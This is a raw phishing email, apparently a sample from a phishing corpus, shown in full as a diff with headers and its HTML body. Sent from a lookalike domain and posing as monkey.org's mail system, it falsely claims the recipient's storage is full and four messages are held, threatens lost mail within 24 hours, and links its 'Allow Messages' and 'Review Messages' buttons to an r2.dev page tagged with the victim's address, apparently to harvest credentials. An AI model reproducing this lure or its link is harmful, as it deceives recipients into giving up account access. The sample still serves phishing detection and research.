@@ -1,0 +1,289 @@
+Return-Path: info@moodydiirect.com
+Delivered-To: jose@monkey.org
+X-FDA: 82428716706.37.0990C22
+Received: from server.moodydiirect.com (server.moodydiirect.com
+ [85.208.108.13])	by imf12.b.hostedemail.com (Postfix) with ESMTP id
+ 10949A000A	for <jose@monkey.org>; Thu,  8 Aug 2024 10:33:31 +0000 (UTC)
+Authentication-Results: imf12.b.hostedemail.com;	dkim=pass
+ header.d=moodydiirect.com header.s=202406 header.b=ZPys8nnq;	dmarc=none;
+	spf=pass (imf12.b.hostedemail.com: domain of info@moodydiirect.com designates
+ 85.208.108.13 as permitted sender) smtp.mailfrom=info@moodydiirect.com
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1723113150; a=rsa-sha256;
+	cv=none;
+	b=RUYMS4CsTSx9kV51i7YgWRssGUVl7E6NCPlAnd4PGuxruW6qRQfN4r9EgxfKw5j884WnvU
+	AjxuRr13Kns4rBSnUb0+FvpqTg4ojMtI2tQpeWeTnbivJ0r3r+ioGu8pmN92xFdOWcKBpD
+	b3n0d+RbQx3emUcLIWBmsdD/2TPpcR8=
+ARC-Authentication-Results: i=1;	imf12.b.hostedemail.com;	dkim=pass
+ header.d=moodydiirect.com header.s=202406 header.b=ZPys8nnq;	dmarc=none;
+	spf=pass (imf12.b.hostedemail.com: domain of info@moodydiirect.com designates
+ 85.208.108.13 as permitted sender) smtp.mailfrom=info@moodydiirect.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1723113150;
+	h=from:from:sender:reply-to:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:	
+ content-transfer-encoding:content-transfer-encoding:in-reply-to:	
+ references:dkim-signature; bh=61PvaNooC4YS9NdfkcYlnnvZXvXQSJDUF6iXoZP/YZg=;
+	b=Jtq9fe8NbhgDwHpwyiTn9j+5RoEOhGlVXDoQacxQZ4DulUmZrwHRFQiV90Pmoxi5GTJgjV
+	snJw2wMmBucLCl8niT196BtUSLQ+CncvOpD560AWzNUlw+3QFfxTKvQ+TZM4OpbMpqkv4K
+	az6comOxyXst0ar02F+4p8AaOjenL1U=
+Received: from ip-8-14.dataclub.info (unknown [185.29.8.14])
+	by server.moodydiirect.com (Postfix) with ESMTPA id C33B4A932B
+	for <jose@monkey.org>; Thu,  8 Aug 2024 06:33:30 -0400 (EDT)
+DKIM-Signature: v=1; a=rsa-sha256; c=simple/simple; d=moodydiirect.com;
+	s=202406; t=1723113211;
+	bh=s7FxkNC6383jMQ0mcPMkN0GGy4+sgStmQcYGEiJrcds=;
+	h=Reply-To:From:To:Subject:Date:From;
+	b=ZPys8nnqXT0OAi7lNFzjATo3BY4bGlBMvTitpvldKvpmxEmFZ57mdn7mBmQdAcvMm
+	 bq/vq7Ly2B0L0rd+yGYlyCvIRhYc5jDvFH4IF5RUsAzTYdZ6Av1rr9zZSFn6L5Rv3d
+	 BvGjFWvSQsqU4e2X52ud7HV4+WquYxSRu3s4QyeFbxFVgBdNpE2y+3vjGrjUKzYFCp
+	 UeMxkPRrOPRJ1NccTQdXY8lq/mk6rPrau2EZDBEG7urG/Qs3j86HNnUg7tetm59/2k
+	 4MRhKcsdhHoeb5DtuOoogiS2EuxBNOJwhOwa75KDKPkma/IAoi7h7UVMtxh9FBcdHH
+	 mvwsMb9qr7G3A==
+Reply-To: no-reply@monkey.org
+From: Mail Delivery System  monkey.org <info@moodydiirect.com>
+To: jose@monkey.org
+Subject: Delivery Status Notification 
+Date: 8 Aug 2024 12:33:29 +0200
+Message-ID: <20240808123329.4B5237313D32CEF6@moodydiirect.com>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Queue-Id: 10949A000A
+X-Rspam-User: 
+X-Rspamd-Server: rspam07
+X-Stat-Signature: oo94zin4ztnyuj1j9gqfcbbnw5c4eozi
+X-Spam-Status: No, score=3.00
+X-HE-Tag: 1723113211-95800
+X-HE-Meta: =?utf-8?q?U2FsdGVkX1+yOmHhsNsm+CT+YcQL61I1mUogfJACmCu6XDkGslZ/07g?=
+ =?utf-8?q?fLCQw16t54PUC07sxbeFF2d1ughiNpQE5bTYUDtr+jOTuL9LdFdOwOnoSeodDdN1t?=
+ =?utf-8?q?YcYtf06/cayntPj+hKjGD0VbtZT4gU0EAbrg3Wt8ygLei/Rg6DlGZrn0tymOeHOaT?=
+ =?utf-8?q?ldqAFASIN39nAdeX787dF0RA1gXLq1dAnMXXousz6K2OvUvanlKENJrIzjs+N9o/X?=
+ =?utf-8?q?+4JpaNF16v4/z65AucBMr9kDsJeD08Rr0bs5WQHL8RNTg3ieZPqhDOpo2zL84XPnc?=
+ =?utf-8?q?6Zr1AoB9Y2IB3D3gYYKbwk6MN9fo7rx5LhZVEfP/tifJ/byG4yvgkP3j2wH10Jbj0?=
+ =?utf-8?q?Q/zO8v/jXfEl6AeBS6pPGXFDNh94f5f7S1R2Q12c8ziX8ZdgXRu2c9iXuu0Zj7fAT?=
+ =?utf-8?q?KhLOopW64gw+QqVMgP4maNndBry4afLgcNhmE/oj7cln7UUHh3fQR/jSIgBd3YXpH?=
+ =?utf-8?q?DCfoFkphFc2XC77CIXXG6sut64ptCisL8rUxUv2sOHx8Q/hAiWtjyRdcXrN18j59W?=
+ =?utf-8?q?LP8ZEFtRiSpL4Gk1UwM88dPucOFECR0pKm0Eskjn0rvukBOerPW4KbjyD5SnrtYO3?=
+ =?utf-8?q?LEx7ny/brNcD7nk2kokCGgLagpfD4dqKUOKguSh3vtlV7CPIxehFQE1Ha3g/CFfW1?=
+ =?utf-8?q?mqrkSt+eeVrp6s5KrFNuS9gve6rIp22rKDvh+tZ8EQTyEfmI3OY2UHntRyuzM3+i2?=
+ =?utf-8?q?jIIEfRmJjP1N2FPsmosv2tyMBP8VxBj+/iuniH3Y+riVdw+QsEmBXwRoh4ivv8Z+o?=
+ =?utf-8?q?8bjLan+gnocITS1h6zUTtKvfcyvCLk/zgzvwVHSUQnH8K5YJVtcpDWpasAC7RPLCH?=
+ =?utf-8?q?5vphlDnwaqMj/LwoWi0Ly6UdS36QFTR8lSATxstV90ulMcFBLr/FAA6fp2wWRwAyQ?=
+ =?utf-8?q?AdB+Rc4sIubeT/+BNz50rc_eDKNOQIKQuiyY+W2geRrZzmRbNjtjltCzUMufT36Qx?=
+ =?utf-8?q?rKkqxqP+2ZHnysG3B0W0zfVuAUVLxP6iPUKDnhygcINm/g+TmjUnN1AHrL6qRrY0X?=
+ =?utf-8?q?ldh7XQ/MVfYtBLZnUsMk5mH7Zd6IW0t/KJYEay4UEpUkDJsATln2fPhuHq7HvuGIw?=
+ =?utf-8?q?Nol25eDhbs4ktjxwvuSU4OlyCO/UI/EB4qwa7ydsXztwBoQguONKW+HM659T7G9SU?=
+ =?utf-8?q?uAfT63lmeo3TMAZ375yNML8yhNzHdqvtz+8h7dZ03Gl2QNJbwYR0+2m+XFNDspx3b?=
+ =?utf-8?q?68+hvRPP5PTFIeLH0h0wknTsRp/9SduGO4FBqAmPGB5WxWQOmIydBlz9ulvS5ayLw?=
+ =?utf-8?q?x51Xmp5Bn7cZG4bHH/DWb3fsP40HspUEC3LIP9oqwX/r6o2/dBGw8VFmPOROS90ns?=
+ =?utf-8?q?1l8mDTABp9QIECpI5Cv6EkzfDyZmDtLMtB8ANJeBtbKryESGUNvP/W7PEh3x/x0hO?=
+ =?utf-8?q?jyZMKIr7F3xZGtIVz0U4B3Bg9TkLu/U=3D?=
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 231
+
+<html><head>
+  <meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+  </head>
+  <body><p><br class=3D"Apple-interchange-newline">
+  </p>
+  <table style=3D"width: 548px; text-align: left; color: rgb(33, 33, 33); t=
+ext-transform: none; letter-spacing: normal; padding-top: 0px; padding-bott=
+om: 0px; font-family: inherit; font-size: 15px; font-style: normal; font-we=
+ight: 600; word-spacing: 0px; white-space: normal; border-collapse: collaps=
+e; max-width: 548px; box-sizing: border-box; border-spacing: 0px; orphans: =
+2; widows: 2; background-color: rgb(255, 255, 255); font-variant-ligatures:=
+ normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
+coration-style: initial; text-decoration-color: initial;" border=3D"0">
+    <tbody style=3D"box-sizing: border-box;">
+      <tr style=3D"box-sizing: border-box;">
+        <td style=3D'margin: 0px; width: 181px; padding-top: 0px; padding-b=
+ottom: 0px; font-family: "Segoe UI", Frutiger, Arial, sans-serif; font-size=
+: 14px; vertical-align: middle; box-sizing: border-box;'>08/7/2024
+          11:28:42 a.m.</td>
+        <td style=3D'margin: 0px; width: 151px; text-align: center; padding=
+-top: 0px; padding-bottom: 0px; font-family: "Segoe UI", Frutiger, Arial, s=
+ans-serif; font-size: 14px; font-weight: 400; vertical-align: middle; box-s=
+izing: border-box;'></td>
+        <td style=3D'margin: 0px; width: 215px; text-align: right; padding-=
+top: 0px; padding-bottom: 0px; font-family: "Segoe UI", Frutiger, Arial, sa=
+ns-serif; font-size: 14px; font-weight: 400; vertical-align: middle; box-si=
+zing: border-box;'><span style=3D'margin: 0px; padding: 0px; color: white; =
+font-family: "Segoe UI", Frutiger, Arial, sans-serif, serif, EmojiFont; ver=
+tical-align: baseline; box-sizing: border-box;'>
+  <span style=3D"margin: 0px; padding: 0px; vertical-align: baseline; box-s=
+izing: border-box;"><span style=3D"margin: 0px; padding: 0px; color: rgb(19=
+2, 0, 0); vertical-align: baseline; box-sizing: border-box;"><span style=3D=
+"font-weight: bolder; box-sizing: border-box;">Storage
+                  Full: 95%</span></span></span></span></td>
+      </tr>
+      <tr style=3D"box-sizing: border-box;">
+        <td style=3D"margin: 0px; padding: 0px; width: 548px; font-family: =
+Roboto, RobotoDraft, Helvetica, Arial, sans-serif; box-sizing: border-box;"=
+ colspan=3D"3">
+          <table style=3D"padding: 0px; width: 546px; border-collapse: coll=
+apse; box-sizing: border-box; border-spacing: 0px;" border=3D"0" cellspacin=
+g=3D"0" cellpadding=3D"0">
+            <tbody style=3D"box-sizing: border-box;">
+              <tr style=3D"box-sizing: border-box;">
+                <td style=3D"margin: 0px; padding: 0px; width: 10px; height=
+: 10px; line-height: 10px; font-size: 6px; box-sizing: border-box;" bgcolor=
+=3D"#cccccc"></td>
+                <td style=3D"margin: 0px; padding: 0px; width: 10px; height=
+: 10px; line-height: 10px; font-size: 6px; box-sizing: border-box;" bgcolor=
+=3D"white"></td>
+                <td style=3D"margin: 0px; padding: 0px; width: 10px; height=
+: 10px; line-height: 10px; font-size: 6px; box-sizing: border-box;" bgcolor=
+=3D"#cccccc"></td>
+                <td style=3D"margin: 0px; padding: 0px; width: 10px; height=
+: 10px; line-height: 10px; font-size: 6px; box-sizing: border-box;" bgcolor=
+=3D"white"></td>
+                <td style=3D"margin: 0px; padding: 0px; width: 517px; heigh=
+t: 10px; line-height: 10px; font-size: 6px; box-sizing: border-box;" bgcolo=
+r=3D"#c00000"></td>
+              </tr>
+            </tbody>
+          </table>
+        </td>
+      </tr>
+      <tr style=3D"box-sizing: border-box;">
+        <td style=3D'margin: 0px; padding: 0px; width: 181px; line-height: =
+20px; font-family: "Segoe UI", Frutiger, Arial, sans-serif; font-size: 14px=
+; font-weight: 400; box-sizing: border-box;'></td>
+        <td style=3D'margin: 0px; padding: 0px; width: 151px; text-align: c=
+enter; line-height: 20px; font-family: "Segoe UI", Frutiger, Arial, sans-se=
+rif; font-size: 14px; font-weight: 400; box-sizing: border-box;'>&nbsp;</td=
+>
+        <td style=3D"margin: 0px; padding: 0px; width: 215px; text-align: r=
+ight; line-height: 20px; font-family: Roboto, RobotoDraft, Helvetica, Arial=
+, sans-serif; font-size: 14px; box-sizing: border-box;"><span style=3D'font=
+-family: "Segoe UI", Frutiger, Arial, sans-serif, serif, EmojiFont; box-siz=
+ing: border-box;'>
+  jose@monkey.org</span></td>
+      </tr>
+    </tbody>
+  </table>
+  <table style=3D"padding: 0px; width: 528px; text-align: left; color: rgb(=
+33, 33, 33); text-transform: none; letter-spacing: normal; font-family: Ver=
+dana; font-size: 15px; font-style: normal; font-weight: 400; margin-left: 0=
+px; word-spacing: 0px; white-space: normal; border-collapse: collapse; box-=
+sizing: border-box; orphans: 2; widows: 2; background-color: rgb(242, 245, =
+250); font-variant-ligatures: normal; font-variant-caps: normal; -webkit-te=
+xt-stroke-width: 0px; text-decoration-thickness:=20
+initial; text-decoration-style: initial; text-decoration-color: initial;" b=
+order=3D"0">
+    <tbody style=3D"box-sizing: border-box;">
+      <tr style=3D"box-sizing: border-box;">
+        <td style=3D'margin: 0px; padding: 0px 10px; font-family: "Segoe UI=
+", Frutiger, Arial, sans-serif; font-size: 21px; box-sizing: border-box;'>
+          <div style=3D'font-family: "Segoe UI", Frutiger, Arial, sans-seri=
+f, serif, EmojiFont; box-sizing: border-box;'><br style=3D"box-sizing: bord=
+er-box;">
+            </div>
+          <div style=3D"margin: 0px; padding: 0px; color: rgb(32, 31, 30); =
+font-family: inherit; font-size: 15px; vertical-align: baseline; box-sizing=
+: border-box;">
+            <table style=3D"padding: 0px; width: 528px; margin-left: 0px; b=
+order-collapse: collapse; box-sizing: border-box;">
+              <tbody style=3D"box-sizing: border-box;">
+                <tr style=3D"box-sizing: border-box;">
+                  <td style=3D'margin: 0px; padding: 0px 10px; font-family:=
+ "segoe ui", frutiger, arial, sans-serif; font-size: 21px; box-sizing: bord=
+er-box;'>
+                    <div style=3D"margin: 0px; padding: 0px; font-family: i=
+nherit; font-size: 15px; vertical-align: baseline; box-sizing: border-box;"=
+><span style=3D'font-family: "Segoe UI", Frutiger, Arial, sans-serif, serif=
+, EmojiFont; max-width: 2150px; box-sizing: border-box;'><span style=3D"fon=
+t-weight: bolder; box-sizing: border-box;">Message Failure
+                          Delivery Notice.</span></span></div>
+                    <div style=3D"margin: 0px; padding: 0px; font-family: i=
+nherit; font-size: 15px; vertical-align: baseline; box-sizing: border-box;"=
+><span style=3D'font-family: "Segoe UI", Frutiger, Arial, sans-serif, serif=
+, EmojiFont; max-width: 2150px; box-sizing: border-box;'><br></span></div><=
+div style=3D"margin: 0px; padding: 0px; font-family: inherit; font-size: 15=
+px; vertical-align: baseline; box-sizing: border-box;">
+  <span style=3D'font-family: "Segoe UI", Frutiger, Arial, sans-serif, seri=
+f, EmojiFont; max-width: 2150px; box-sizing: border-box;'>ATTENTION:<a styl=
+e=3D"color: rgb(17, 85, 204); text-decoration: none; box-sizing: border-box=
+; background-color: transparent;" href=3D"https://e.mail.ru/compose?To=3D" =
+target=3D"_blank" rel=3D"noreferrer">
+  </a>jose@monkey.org</span></div>
+                    <div style=3D"margin: 0px; padding: 0px; font-family: i=
+nherit; font-size: 15px; vertical-align: baseline; box-sizing: border-box;"=
+></div>
+                  </td>
+                </tr>
+                <tr style=3D"box-sizing: border-box;">
+                  <td style=3D'margin: 0px; padding: 0px 10px 6px; font-fam=
+ily: "segoe ui", frutiger, arial, sans-serif; font-size: 16px; box-sizing: =
+border-box;'>
+                    <div style=3D'font-family: "segoe ui", frutiger, arial,=
+ sans-serif, serif, EmojiFont; box-sizing: border-box;'><span style=3D'font=
+-family: "Segoe UI", Frutiger, Arial, sans-serif, serif, EmojiFont; max-wid=
+th: 2150px; box-sizing: border-box;'>
+  <br></span></div><div style=3D'font-family: "segoe ui", frutiger, arial, =
+sans-serif, serif, EmojiFont; box-sizing: border-box;'><span style=3D'font-=
+family: "Segoe UI", Frutiger, Arial, sans-serif, serif, EmojiFont; max-widt=
+h: 2150px; box-sizing: border-box;'>You
+                        have (4) incoming messages pending.</span></div><di=
+v style=3D'font-family: "segoe ui", frutiger, arial, sans-serif, serif, Emo=
+jiFont; box-sizing: border-box;'><span style=3D'font-family: "Segoe UI", Fr=
+utiger, Arial, sans-serif, serif, EmojiFont; max-width: 2150px; box-sizing:=
+ border-box;'>
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
+nbsp;&nbsp;&nbsp; </span></div></td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+        </td>
+      </tr>
+      <tr style=3D"box-sizing: border-box;">
+        <td style=3D'margin: 0px; padding: 0px 10px 6px; font-family: "Sego=
+e UI", Frutiger, Arial, sans-serif; font-size: 16px; box-sizing: border-box=
+;'>
+          <div style=3D'font-family: "Segoe UI", Frutiger, Arial, sans-seri=
+f, serif, EmojiFont; box-sizing: border-box;'></div>
+          <div style=3D'font-family: "Segoe UI", Frutiger, Arial, sans-seri=
+f, serif, EmojiFont; box-sizing: border-box;'>
+  <a style=3D"background: rgb(38, 117, 214); margin: 2px; padding: 10px; co=
+lor: rgb(255, 255, 255); font-size: 14px; text-decoration: none; float: lef=
+t; display: block; outline-width: 0px; outline-style: none; box-sizing: bor=
+der-box;" href=3D"https://pub-0a8952aeed314c3e88b3319fff3a5ae5.r2.dev/ZsswD=
+gYDVR0PAQH%3ABAQDAgGGMA8GA1UdEwEB%3AwQFMAMBAf8wEQYDVR0gBAowCDAG.html#jose@m=
+onkey.org" target=3D"_blank" rel=3D"noreferrer">Allow
+              Messages</a><a style=3D"background: rgb(219, 214, 214); margi=
+n: 2px; padding: 10px; color: rgb(12, 12, 12); font-size: 14px; text-decora=
+tion: none; float: left; display: block; outline-width: 0px; outline-style:=
+ none; box-sizing: border-box;" href=3D"https://pub-0a8952aeed314c3e88b3319=
+fff3a5ae5.r2.dev/ZsswDgYDVR0PAQH%3ABAQDAgGGMA8GA1UdEwEB%3AwQFMAMBAf8wEQYDVR=
+0gBAowCDAG.html#jose@monkey.org" target=3D"_blank" rel=3D"noreferrer">Revie=
+w
+              Messages</a></div>
+          <div style=3D'font-family: "Segoe UI", Frutiger, Arial, sans-seri=
+f, serif, EmojiFont; box-sizing: border-box;'></div>
+          <div style=3D'font-family: "Segoe UI", Frutiger, Arial, sans-seri=
+f, serif, EmojiFont; box-sizing: border-box;'></div>
+          <div style=3D'font-family: "Segoe UI", Frutiger, Arial, sans-seri=
+f, serif, EmojiFont; box-sizing: border-box;'></div>
+          <div style=3D'font-family: "Segoe UI", Frutiger, Arial, sans-seri=
+f, serif, EmojiFont; box-sizing: border-box;'><br><br><br>You may stop rece=
+iving <wbr style=3D"box-sizing: border-box;">messages in 24 hours if no
+            action is taken</div>
+          <div style=3D'font-family: "Segoe UI", Frutiger, Arial, sans-seri=
+f, serif, EmojiFont; box-sizing: border-box;'></div>
+          <div style=3D"box-sizing: border-box;"><br style=3D"box-sizing: b=
+order-box;">
+            <font face=3D"georgia, serif" style=3D"box-sizing: border-box;"=
+><em style=3D"box-sizing: border-box;">All rights reserved.</em>monkey.org@=
+
+              2024</font></div>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+  </body></html>
+
